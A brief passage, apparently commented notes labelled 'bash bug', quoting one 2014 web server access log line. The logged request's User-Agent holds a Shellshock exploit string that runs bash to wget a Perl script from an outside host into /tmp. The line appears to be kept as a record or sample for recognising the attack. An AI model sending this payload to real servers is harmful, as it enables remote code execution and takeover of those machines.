...
# bash bug
# 8.37.231.18 - - [26/Sep/2014:08:56:37 +0800] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 301 178  "-" "() { :;}; /bin/bash -c \x22/usr/bin/wget http://singlesaints.com/firefile/temp?h=kktv1.com -O /tmp/a.pl\x22" "-" "91.201.53.25"
#